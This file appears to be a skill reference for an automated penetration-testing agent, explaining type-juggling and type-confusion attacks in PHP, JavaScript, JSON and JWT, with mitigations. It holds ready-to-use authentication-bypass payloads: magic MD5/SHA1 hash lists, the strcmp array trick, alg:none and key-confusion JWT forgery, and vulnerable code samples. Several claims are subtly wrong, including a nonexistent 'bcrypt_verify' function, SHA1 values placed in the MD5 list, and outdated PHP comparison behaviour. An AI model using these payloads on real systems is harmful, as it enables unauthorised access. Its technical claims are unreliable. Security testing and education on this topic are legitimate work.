---
name: type-juggling
description: Type juggling and type confusion attacks in PHP, JavaScript, and other loosely-typed languages
---

# Type Juggling / Type Confusion

Type juggling exploits how loosely-typed languages compare values of different types. PHP's `==` operator, JavaScript's `==`, and JSON type coercion can produce unexpected equality results that bypass authentication, signature verification, and input validation.

## Attack Surface

**Vulnerable Languages**
- PHP (most severe — `==` with type coercion)
- JavaScript (`==` loose equality, `parseInt`, JSON parsing)
- Python (limited, but type confusion in certain comparisons)
- Ruby (similar loose equality patterns)
- Java (type confusion in serialization, `instanceof` bypass)

**Common Contexts**
- Authentication token/hash comparison
- Password reset token validation
- Admin privilege checks (`role == 0`)
- Signature verification
- JSON input parsing
- Version/feature flag comparisons

## PHP Type Juggling

### Loose Comparison Table (==)

```php
// PHP == comparison surprises:
0 == "a"          // TRUE (string "a" cast to int 0)
0 == ""           // TRUE
0 == "foo"        // TRUE (string starting with non-numeric)
0 == "0.0"        // TRUE
0 == false        // TRUE
0 == null         // TRUE
"1" == "01"       // TRUE
"10" == "1e1"     // TRUE
100 == "1e2"      // TRUE
"0" == false      // TRUE
"" == false       // TRUE
"" == null        // TRUE
"0" == null       // FALSE (!)
null == false     // TRUE
true == 1         // TRUE
true == "a"       // TRUE
true == 2         // TRUE
"1" == true       // TRUE
"0" == false      // TRUE
```

### Hash Comparison Bypass (Magic Hashes)

PHP's `==` treats strings starting with `0e` followed by digits as scientific notation (0):
```php
// All of these equal each other with ==:
"0e462097431906509019562988736854" == "0e830400451993494058024219903391"
md5("240610708")   // "0e462097431906509019562988736854"
md5("QNKCDZO")     // "0e830400451993494058024219903391"
md5("aabg7XSs")    // "0e087386482136013740957780965295"
md5("aabC9RqS")    // "0e041022518165728065344349536299"
sha1("aaroZmOk")   // "0e66507019969427134894567494305185566735"
sha1("aaK1STfY")   // "0e76658526655756207688271159624026011393"
```

Attack:
```php
// Vulnerable code:
if (md5($token) == $stored_hash) { login(); }
// If stored_hash is a 0e magic hash, any magic hash token bypasses
```

### Array/Object Bypass

```php
// Vulnerable:
if ($input == "expected_value") { ... }
// Input: array() — PHP: array == string → false... BUT:
// Some comparison chains:
if (strcmp($input, "expected") == 0) { ... }
// strcmp(array, string) returns NULL in PHP < 5.3.3
// NULL == 0 → TRUE → bypass!
```

### Null Byte / Type Coercion in Auth

```php
// JSON input: {"role": true, "admin": 1}
// PHP json_decode → stdClass with boolean/int
// If compared: $user->role == 0 → true == 0 → FALSE (safe)
// But: $user->role == 1 → true == 1 → TRUE (bypass admin check)
```

## JavaScript Type Juggling

### Loose Equality

```javascript
0 == false        // true
0 == ""           // true
0 == "0"          // false (!)
"" == false       // true
"" == "0"         // false
null == undefined // true
null == false     // false (!)
NaN == NaN        // false

// parseInt tricks:
parseInt("123abc") === 123  // Stops at non-numeric
parseInt("0x10") === 16     // Hex parsing

// JSON parsing:
JSON.parse("01")   // SyntaxError or 1 depending on engine
```

### Array Comparison

```javascript
[] == false   // true
[] == 0       // true
[] == ""      // true
[1] == 1      // true
["1"] == 1    // true
```

## JSON Type Confusion

**Boolean/Number Injection**
```json
// Sending boolean where string expected:
{"admin": true}  // vs {"admin": "false"}
{"role": 0}      // vs {"role": "user"}
{"age": null}    // vs {"age": 0}

// If server checks: if (role == "admin") → role=true might pass
// If server checks: if (!isAdmin) → isAdmin=[] (truthy) might bypass
```

**Type Coercion in JWT**

```json
// alg: none attack (separate from juggling but related)
{"alg": "none", "typ": "JWT"}
// Or: {"alg": "None"}, {"alg": "NONE"}, {"alg": "nOnE"}

// HS256 vs RS256 confusion:
// Server expects RS256 public key verification
// Attacker uses public key as HS256 secret → forged tokens
```

## Bypass Techniques

**PHP Hash Bypass Wordlist**

```
# MD5 0e magic values (hash starts with 0e[digits]):
240610708, QNKCDZO, aabg7XSs, aabC9RqS, aaK1STfY, aaO8zKZF

# SHA1 0e magic values:
aaroZmOk, aaK1STfY, aaO8zKZF, aa3OFF9m, aa17YY7s

# MD5 0e with uppercase:
0E215962017

# Use with: if (md5($_GET['hash']) == "0e...") { bypass(); }
```

**strcmp() NULL Bypass**

```
# PHP: strcmp(array(), "string") returns NULL
# NULL == 0 → true
# Send: password[]=anything in POST body
```

**Type Coercion in Switch**

```php
// PHP switch uses ==:
switch ($input) {
    case 0: admin_access(); break;
    case "user": user_access(); break;
}
// Input: "any_string" → PHP: "any_string" == 0 → TRUE → admin_access()
```

## Testing Methodology

1. **Identify comparison points** — Auth tokens, role checks, signature validation, feature flags
2. **Test boolean inputs** — Submit `true`, `false`, `1`, `0`, `null` via JSON
3. **Test array inputs** — `param[]=value` in POST, `[value]` in JSON
4. **Test 0e hash values** — Known magic MD5/SHA1 values for hash comparison bypass
5. **Test type confusion in JWT** — alg:none, alg confusion (HS256 with RS256 key)
6. **Test PHP strcmp** — Send array for string comparison parameters
7. **Test JavaScript** — Look for `==` in client-side auth logic

## Validation

1. Demonstrate authentication bypass using a type confusion payload
2. Show the specific comparison that is bypassed and why
3. For PHP: show magic hash values returning equal comparison
4. For JWT: show forged token accepted

## False Positives

- Application uses strict comparison (`===` in PHP/JS)
- Typed language (Go, Rust, Java) without dynamic type coercion
- Input validated and cast to expected type before comparison
- `hash_equals()` used instead of `==` for hash comparison

## Impact

- Authentication bypass (login without valid credentials)
- Privilege escalation (user → admin via type confusion)
- Signature/hash verification bypass
- Token forgery (JWT algorithm confusion)

## Pro Tips

1. PHP magic hashes are a classic CTF/bug bounty vector — always test on hash comparison endpoints
2. JSON API? Try sending `true`/`false`/`null`/`0` for string parameters, especially role/admin fields
3. `===` (strict equality) prevents type juggling — look for `==` in PHP source code reviews
4. JWT `alg: none` bypass is still found in production — especially in internal tools
5. PHP's `in_array()` also uses loose comparison by default — test with `0` against string arrays
6. Python `__eq__` overloads can introduce type confusion in custom objects
7. `bcrypt_verify("0e12345", $hash)` — PHP bcrypt truncates at null byte — test `\x00` in passwords

## Summary

Type juggling turns loose equality operators into security vulnerabilities. PHP's `==` and JSON type coercion are the most dangerous. Use strict comparisons, validate and cast inputs to expected types, and use constant-time comparison functions (`hash_equals`) for security-sensitive values.
